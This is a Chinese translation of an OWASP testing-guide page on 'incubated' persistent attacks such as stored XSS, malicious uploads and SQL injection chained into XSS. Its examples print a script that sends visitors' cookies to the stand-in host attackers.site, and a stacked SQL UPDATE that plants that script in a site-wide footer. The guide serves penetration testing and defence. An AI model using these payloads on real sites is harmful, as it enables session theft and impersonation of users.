# 测试孵化漏洞

|ID          |
|------------|
|WSTG-INPV-14|

## 概述

孵化测试（通常也称为持续性攻击）是一种复杂的测试方法，需要不止一个数据验证漏洞才能奏效。孵化漏洞通常用于对合法 Web 应用程序的用户进行“水坑”攻击。

孵化漏洞具有以下特征：

- 首先，攻击向量需要被持久化，即需要存储在持久层中。只有当存在弱数据验证，或者数据通过其他渠道（如管理控制台或直接通过后端批处理进程）进入系统时，才会发生这种情况。
- 其次，一旦攻击向量被“召回”，该向量需要被成功执行。例如，一个孵化的 XSS 攻击需要弱的输出验证，以便脚本能够以可执行的形式传递给客户端。

利用某些漏洞，甚至是 Web 应用程序的功能特性，攻击者可以植入一段数据，该数据稍后会被不知情的用户或系统的其他组件检索，从而利用该处的某些漏洞。

在渗透测试中，`孵化攻击`可用于评估某些漏洞的严重性，利用发现的具体安全问题来构建基于客户端的攻击，这种攻击通常用于同时针对大量受害者（例如，所有浏览该站点的用户）。

这种类型的异步攻击涵盖了广泛的攻击向量，其中包括：

- Web 应用程序中的文件上传组件，允许攻击者上传损坏的媒体文件（利用 `CVE-2004-0200` 的 JPEG 图像、利用 `CVE-2004-0597` 的 PNG 图像、可执行文件、包含活动组件的站点页面等）。
- 公共论坛帖子中的跨站脚本问题（更多详细信息请参见[测试存储型跨站脚本](02-Testing_for_Stored_Cross_Site_Scripting.md)）。攻击者可能将恶意脚本或代码存储在 Web 应用后端的存储库（例如数据库）中，以便该脚本/代码被某个用户（最终用户、管理员等）执行。典型的孵化攻击示例是利用用户论坛、公告板或博客中的跨站脚本漏洞，在易受攻击的页面注入一些 JavaScript 代码，该代码最终将在站点用户的浏览器中呈现和执行——利用原始（易受攻击）站点在用户浏览器中的信任级别。
- SQL/XPATH 注入允许攻击者将内容上传到数据库，稍后该内容将作为网页活动内容的一部分被检索。例如，如果攻击者可以在公告板中发布任意 JavaScript 以便用户执行，那么他就可以控制他们的浏览器（例如，[XSS-proxy](https://sourceforge.net/projects/xss-proxy)）。
- 配置错误的服务器允许安装 Java 包或类似的站点组件（例如 Tomcat，或诸如 Plesk、CPanel、Helm 等 Web 托管控制台）。

## 测试目标

- 识别被存储且需要召回步骤才能触发存储注入的注入点。
- 了解召回步骤可能如何发生。
- 如果可能，设置监听器或激活召回步骤。

## 如何测试

### 黑盒测试

#### 文件上传示例

验证 Web 应用程序允许上传的内容类型以及上传文件的生成 URL。上传一个文件，该文件在用户查看或下载时会利用本地用户工作站上的某个组件。向受害者发送电子邮件或其他类型的提醒，以引导他们浏览该页面。预期结果是，当用户浏览生成的页面或从受信任站点下载并执行该文件时，漏洞利用将被触发。

#### 公告板上的 XSS 示例

1. 将 JavaScript 代码作为易受攻击字段的值引入，例如 `<script>document.write('<img src="https://attackers.site/cv.jpg?'+document.cookie+'">')</script>`
2. 引导用户浏览易受攻击的页面，或等待用户浏览它。在 `attackers.site` 主机上设置一个“监听器”，监听所有传入连接。
3. 当用户浏览易受攻击的页面时，一个包含其 cookie 的请求（`document.cookie` 作为所请求 URL 的一部分）将被发送到 `attackers.site` 主机，例如：`GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE; HTTP/1.1`
4. 使用获取的 cookie 在易受攻击的站点上冒充用户。

#### SQL 注入示例

通常，这类示例通过利用 SQL 注入漏洞来发起 XSS 攻击。首先要测试的是目标站点是否存在 SQL 注入漏洞。这在[测试 SQL 注入](05-Testing_for_SQL_Injection.md)中有所描述。对于每个 SQL 注入漏洞，都有一组底层约束描述了攻击者/渗透测试人员被允许执行的查询类型。

然后，测试人员需要将他们设计的 XSS 攻击与他们被允许插入的条目进行匹配。

与之前的 XSS 示例类似，使用易受 SQL 注入问题的网页字段来更改数据库中的值，该值将被应用程序用作输入，在站点上显示时未经适当过滤（这是 SQL 注入和 XSS 问题的组合）。例如，假设数据库中有一个 `footer` 表，包含所有站点页面的页脚，其中包括一个 `notice` 字段，包含每个网页底部的法律声明。您可以使用以下查询将 JavaScript 代码注入数据库 `footer` 表的 `notice` 字段。

```sql
SELECT field1, field2, field3
FROM table_x
WHERE field2 = 'x';
   UPDATE footer
   SET notice = 'Copyright 1999-2030%20
       <script>document.write(\'<img src="https://attackers.site/cv.jpg?\'+document.cookie+\'">\')</script>'
   WHERE notice = 'Copyright 1999-2030';
```

现在，每个浏览该站点的用户都会静默地将他们的 cookie 发送到 `attackers.site`。

#### 配置错误的服务器

某些 Web 服务器提供管理界面，可能允许攻击者上传其选择的主动组件到站点。例如，Apache Tomcat 服务器如果未对访问其 Web 应用程序管理器实施强凭据验证（或者渗透测试人员已通过其他方式获得管理模块的有效凭据），就可能出现这种情况。

在这种情况下，可以上传 WAR 文件并在站点部署新的 Web 应用程序，这不仅允许渗透测试人员在服务器本地执行其选择的代码，还可以在受信任站点植入一个应用程序，站点的常规用户可以访问该应用程序（很可能比访问其他站点时具有更高的信任度）。

同样显而易见的是，通过主机上任何可利用的漏洞（这些漏洞可赋予攻击者 Web 根目录写入权限）来更改服务器上的网页内容的能力，也有助于在 Web 服务器页面上植入此类孵化攻击（实际上，这是某些 Web 服务器蠕虫已知的感染传播方法）。

### 灰盒测试

灰盒或白盒测试技术与前述相同。

- 检查输入验证是缓解此漏洞的关键。如果企业中的其他系统使用相同的持久层，它们可能存在弱的输入验证，数据可能通过 `后门` 被持久化。
- 为了应对客户端的 `后门` 问题，还必须采用输出验证，以便在显示给客户端之前对受污染的数据进行编码，从而使其不被执行。
